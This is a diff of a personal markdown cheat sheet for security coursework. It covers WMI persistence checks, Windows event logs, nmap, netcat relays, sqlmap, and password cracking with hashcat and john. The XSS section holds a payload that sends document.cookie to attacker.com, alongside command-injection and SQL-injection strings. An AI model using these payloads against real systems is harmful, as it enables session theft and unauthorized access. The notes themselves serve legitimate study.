@@ -6,7 +6,8 @@
 
 ## Looking for WMI persistence Objects:
     `Get-WMIObject -Namespace root\Subscription -Class_EventFilter | fl -property query`
-    `Get-WMIObject -Namespace root\Subscription -Class_EventTrigger | fl -property query`
+
+
 	
 ## WMI titbits
 ### execute EXE in an ADS
@@ -29,110 +30,110 @@
     `Get-Item * -stream *`
     `Get-Content * -Stream *`
 
-## Getting Event logs:
+## Event logs:
 ### powershell
     1. `Get-WinEvent -FilterHashTable @{LogName='Security';ID='4720'}`
     2. `Get-WinEvent Security | Where-object Id -eq '4720' | fl TimeCreated, Message`
 ### wevutil (win7)
     `wevutil qe security /f:text`
-
+    
+### DeepBlueCLI 
+-good quick method to analze event logs for interesting events
+  - `DeepBlue.ps1 logfile.evtx`
+  - `deepblue.ps1 -Log System/security/etc`
+  - Against remote host:
+    1. `$credential = get-credential`
+    2. `deepblue.ps1 -log <logname> -Hostname <hostname> -Credential $credential`
 
 ## Command Injection Patterns
-	```
-    	-h
-	; echo Injected
-	| echo Injected
-	|| echo Injected
-	& echo Injected
-	&& echo Injected
-	$(echo Injected)
-	`echo Injected
-	>(echo Injected)
-   	```
+```
+-h
+; echo Injected
+| echo Injected
+|| echo Injected
+& echo Injected
+&& echo Injected
+$(echo Injected)
+`echo Injected
+>(echo Injected)
+```
 
 ## XSS paste this simbols into parameters and check source code to see if they get printed back verbatim
-	```
-    (";!--"<XSS>=&{()}
-	Common XSS attacks
-	<script<alert('xss');</script>
-	src=javascript:alert('XSS');
-	<script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
-   	```
+```
+(";!--"<XSS>=&{()}
+Common XSS attacks
+<script<alert('xss');</script>
+src=javascript:alert('XSS');
+<script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
+```
 
 
 ## SQL Injection
-	```
-    ='or'='
-	SQL command delimiter --
-	SQL query terminator ;
-    	```
+```
+='or'='
+SQL command delimiter --
+SQL query terminator ;
+```
 
 ## SQL map:
-	```
-    if you are gonna use sqlmap first go to the form, add someting to each form parameter (antything), and click submit (use the URL with the list of paramters for sqlmap to work with)
-	sqlmap -u "http://domain/page/script.php?c=1&name=john&last=snow......" 
-	--dbs first to list databases
-	-D <database name> --tables   (to get table names)
-    	```
+```
+if you are gonna use sqlmap first go to the form, add someting to each form parameter (antything), and click submit (use the URL with the list of paramters for sqlmap to work with)
+sqlmap -u "http://domain/page/script.php?c=1&name=john&last=snow......" 
+--dbs first to list databases
+-D <database name> --tables   (to get table names)
+```
 	
 	
 ## BPF (berkley packet filter)
-	```
-    type: host, net, port, portrange
-	dir: (direction) src, dst
-	proto: ip, tcp, udp, icmp, etc
-	operators: and &&, or ||, not !
-	use parenthesis to group as needed
-  	```
+```
+type: host, net, port, portrange
+dir: (direction) src, dst
+proto: ip, tcp, udp, icmp, etc
+operators: and &&, or ||, not !
+use parenthesis to group as needed
+```
 	
 ## tcpdump (pcapng supports comments):
-	```
-    uses BPFs
-	tcpdump -r <file.pcap> 'src host <ip>'
-    	```
+```
+uses BPFs
+tcpdump -r <file.pcap> 'src host <ip>'
+```
 	
 ## NMAP  
-	```
-    (if you SSHed into a host check ifconfig to see what ranges to scan are avaible) 
-	(if nmap is not present use net cat for scanning)
-	sudo nmap -p0-10000 <dest IP or CIDR>
-	hostscan -sn 192.168.0.0/24   (it uses ICMP echo, ICMP Timestamp, and a few other methods)
-	aggressive scan -A  (use this on test)
-	--script  <script name> --script-args <script args name=arg value>
-	--reason to show why it was determined up/down open/closed
-	-p- (all) ports -p 0-1024  (range) -p 1,2,3  (list)
-	-sV for version will do more tests to get what service name. server, etc is running. (includded in -A command)
-    	```
+```
+(if you SSHed into a host check ifconfig to see what ranges to scan are avaible) 
+(if nmap is not present use net cat for scanning)
+sudo nmap -p0-10000 <dest IP or CIDR>
+hostscan -sn 192.168.0.0/24   (it uses ICMP echo, ICMP Timestamp, and a few other methods)
+aggressive scan -A  (use this on test)
+--script  <script name> --script-args <script args name=arg value>
+--reason to show why it was determined up/down open/closed
+-p- (all) ports -p 0-1024  (range) -p 1,2,3  (list)
+-sV for version will do more tests to get what service name. server, etc is running. (includded in -A command)
+```
 
-## netcat (print cheat )
-	```
-    -reminder you can't listen for connections for a particular IP only of a particular port e.g., nc -l -p 3333
-	relay: makefifo namedpipe; nc -l -p 8888 < namedpipe | nc <dest ip> <dest port> > namedpipe
-	get banner or other data from an open port:   nc <ip> <port> > output.txt
-    	```
+
 
 ## Metasploit
-	```
-    practice searching for payload and exploits inside of metasploit: search type:exploit psexec
-	in the course the most used exploit and payloads are psexec ones make a list of the full paths because many show up in the output. 
-		I think:
-			windows/smp/psexec
-			windows/meterpreter/psexec
-    	```
+Practice searching for payload and exploits inside of metasploit: `search type:exploit psexec`
+
 
 ## volatility
-	```
-    print the sans cheat sheet
-	use 
-	export VOLATILITY_LOCATION="file:///home/...././/file.mem"
-	export VOLATILITY_PROFILE="Win..."
-    	```
+```
+print the sans cheat sheet
+- Use 
+    `export VOLATILITY_LOCATION="file:///home/...././/file.mem"`	
+    `export VOLATILITY_PROFILE="Win..."`
 
-## Hashcat 
+
+## Passwords
+
+### Hashcat 
 - -m (hash type). [## linux password format] Full list here https://hashcat.net/wiki/doku.php?id=example_hashes
 - -a attack modes 
+
 | # | Mode |
-| --- | ----- |
+| --- | -------------------- |
 | 0 | Straight |
 | 1 | Combination |
 | 3 | Brute-force |
@@ -142,22 +143,22 @@
   
 
 
-## John The Ripper
+### John The Ripper
 *if you don't specify a is defaults to a (--single) attack mode where it uses wordlist generated from the passwd file GECOS fields for each user *combinator attack is part of hashcat*
     ```
     unshadow passwd shadow > combined
 	john combined
     ```
-    
-### parmeters
-#### attack types
-- --single
+#### Parmeters
+##### Attack types
+- `--single`
+- `--wordlist=\path\to\wodlist.txt`
 - 
-#### Show 
+##### Show 
 - `--show` to show all passwords (cracked and missing) 
 - `--show=left` to show uncracked ones
 
-#### format
+##### Format
 * this defines the type of hash *
 - `--list=formats` to list all available formats
 - `--format=descrypt`
@@ -166,24 +167,28 @@
 - `--format=sha512crypt`
 - etc
 
-
-## linux password format in shadow file
+### Formats
+#### Linux password format in shadow file
 `$hashtype$salt$pwdhash`
 * &linux shadow file hash type markers, encryption is DESCRYPT for ALL OF THEM:& *
-    | marker | hashtype |
-    | --- | ----- |
-    | $1$ – MD5 |
-    | $2$ – Blowfish |
-    | $3$ – Blowfish |
-    | $5$ – SHA-256 |
-    | $6$ – SHA-512 |
+
+| marker | hashtype |
+| --- | ----------- |
+| $1$ | MD5 |
+| $2$ | Blowfish |
+| $3$ | Blowfish |
+| $5$ | SHA-256 |
+| $6$ | SHA-512 |
+
 * For password cracking with john you'll use a descrypt variant in the `--format=<hashformat>` command *
 
-## EMPTY HASHES memory aid:
+#### EMPTY HASHES memory aid:
 - NT: 31D.CFE.D.....
 - NTLM: aad...b..b..........404ee
 
-## SMB reconnaisance
+
+## SMB
+### SMB reconnaisance
 - multiple ways. rcpclient, smbclient, net use, etc.
 - An attacker tools for it is sharpview, only needs a simple account's creds to work. 
 
@@ -243,7 +248,7 @@ https://ss64.com/nt/net.html
 #### net localgroup administrators
 	show who is in the admin group
 
-#### netsh (windows tool, lolbin)
+### netsh (windows tool, lolbin)
 	get host firewall settings
 		netsh advfirewall show currentprofile
 	port forwarding:
@@ -255,17 +260,14 @@ https://ss64.com/nt/net.html
 	netstat -naob (shows process ID and associatee EXE/DLL)
 	netstat -naob 5 (auto refresh every 5 seconds)
     
-    
-## DeepBlueCLI good quick method to analze event logs for interesting events
-	DeepBlue.ps1 logfile.evtx
-	deepblue.ps1 -Log System/security/etc
-	remotely
-		$credential = get-credential
-		deepblue.ps1 -log <logname> -Hostname <hostname> -Credential $credential
-    
+### netcat (print cheat )
+- RFeminder you can't listen for connections for a particular IP only of a particular port e.g., `nc -l -p 3333`
+- NC Relay: `makefifo namedpipe; nc -l -p 8888 < namedpipe | nc <dest ip> <dest port> > namedpipe`
+- Get banner or other data from an open port:   `nc <ip> <port> > output.txt`
+
 	
 ## DNS
-- many packets on TCP port 53 is likely a zone transfer:
+- Many packets on TCP port 53 is likely a zone transfer:
   - FULL PROCESS:
     - run whois on a domain , pick on of their name servers NS....
 		resolve NS IP using 'host' command. e.g., host <ns....>
